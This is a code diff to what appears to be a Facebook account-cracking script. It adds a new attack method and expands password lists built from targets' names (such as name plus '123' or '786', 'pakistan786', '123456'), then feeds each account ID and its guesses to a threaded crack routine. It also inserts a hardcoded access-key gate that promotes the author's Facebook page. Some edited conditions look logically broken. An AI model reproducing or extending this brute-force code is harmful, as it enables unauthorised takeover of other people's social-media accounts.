@@ -205,18 +205,20 @@ def setting():
 		print (' [!] Choose Correct Option')
 		exit()
 	clear()
-	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m');print(' [03] Method 3 \033[1;97m')
 	hc = input ("\n [+] Method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
 		method.append('free')
+	elif hc in ['3','03']:
+		method.append('web')
 	else:
 		method.append('mobile')
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] FIRST + DIGITS \n [02] ALL NAME PASS \n [03] FULL NAME PASS')
+	print(logo);print  ('\n [01] MIX PASSWAORD \n [02] ALL NAME PASS \n [03] FULL NAME PASS')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -235,20 +237,27 @@ def first():
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
 			pwv = []
-			if len(first+ last)<6:
-				if len(first)<3:
+			if len(first+ last):
+				if len(first):
 					pass
 				else:
 					pwv.append(first+last)
 					pwv.append(first+'123')
 					pwv.append(first+'12345')
+					pwv.append(last+'123')
+					pwv.append(last+'12345')
 			else:
-				if len(first)<3:
+				if len(first):
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(first+'123')
-					pwv.append(first+'12345')
+					pwv.append(first+last+'12')
+					pwv.append(first+last+'786')
+					pwv.append('445566')
+					pwv.append('112233')
+					pwv.append('786786')
+					pwv.append('pakistan786')
+					pwv.append('123456')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -281,16 +290,17 @@ def name2():
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
+			first,last = nmf.split(' ')[0],nmf.split(' ')[1]
 			pwv = []
 			if len(nmf):
-				if len(frs):
+				if len(first+last):
 					pass
 				else:
-					pwv.append(nmf)
+					pwv.append(first+ last)
 			else:
-				if len(frs):
-					pwv.append(nmf)
+				if len(first+last):
+					pwv.append(first+last+'12')
+					pwv.append(first+last+'786')
 				else:
 					pwv.append(nmf)
 			if 'mobile' in method:
@@ -418,7 +428,7 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
+		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print("\033[1;37mNOTE : FOR APROVAL LIKE FB PAGE ")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - -")	
 		
@@ -438,7 +448,23 @@ class Main:
 			time.sleep(3.0)
 			print("\033[1;37m    CHEKING APROVAL ")
 			print("")
-			input("\n\033[1;37m Type PAGE Name \033[1;37m")
+			CorrectUsername = 'KHD302'
+			CorrectPassword = 'KHD302'
+			os.system('clear')
+			loop = 'true'
+			while (loop == 'true'):
+				username = raw_input('\033[1;91mENTER KEY :\n\033[1;93m ')
+				if (username == CorrectUsername):
+					print ('\033[1;92m Logged in successfully as ')
+					time.sleep(1)
+					os.system('xdg-open https://m.facebook.com/khdxrsubrand')
+					os.system('clear')
+					loop = 'false'
+			else:
+				print ('\033[1;93m ENTER KEY IS RONG CONTECT ON PAGE!')
+				os.system('xdg-open https://m.facebook.com/khdxrsubrand')
+				os.system('clear')
+			done = False
 			time.sleep(3.1)
 			print("")
 			print("\033[1;32m ASLAM O ALIKUM")
